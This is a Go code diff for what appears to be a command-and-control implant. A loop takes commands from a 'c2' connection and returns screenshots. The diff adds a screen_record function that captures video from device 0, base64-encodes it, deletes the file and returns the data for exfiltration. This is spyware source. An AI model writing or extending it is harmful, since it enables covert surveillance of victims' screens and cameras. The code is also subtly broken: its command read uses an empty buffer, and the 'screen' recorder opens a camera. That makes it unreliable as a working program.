@@ -11,7 +11,9 @@ import (
 	"strings"
 	"time"
 
+	sr "github.com/fstanis/screenresolution"
 	"github.com/kbinani/screenshot"
+	"gocv.io/x/gocv"
 )
 
 const (
@@ -95,10 +97,10 @@ func engage_via(conn net.Conn) {
 	// continually receive commands from c2 and act on them
 
 	for {
-		var cmd string
+		var cmd, result string
 		conn.Read([]byte(cmd))
 		if cmd == "screenshot" {
-			result := screen_capture()
+			result = screen_capture()
 			conn.Write([]byte(result))
 		}
 	}
@@ -121,6 +123,27 @@ func screen_capture() string {
 	return result
 }
 
-func screen_record() string {
+func screen_record(t int) string {
+	file := "screen.avi"
+	res := sr.GetPrimary()
+	width, height := res.Width, res.Height
 
+	capture, _ := gocv.OpenVideoCapture(0)
+	capture.Set(gocv.VideoCaptureFrameWidth, float64(width))
+	capture.Set(gocv.VideoCaptureFrameHeight, float64(height))
+	writer, _ := gocv.VideoWriterFile(file, "MJPG", 30, width, height, true)
+
+	endTime := time.Now().Add(time.Second * time.Duration(t))
+	for time.Now().Before(endTime) {
+		img := gocv.NewMat()
+		capture.Read(&img)
+		writer.Write(img)
+		img.Close()
+	}
+
+	capture.Close()
+	result := b64_file(file) 
+	os.Remove(file)
+	
+	return result
 }
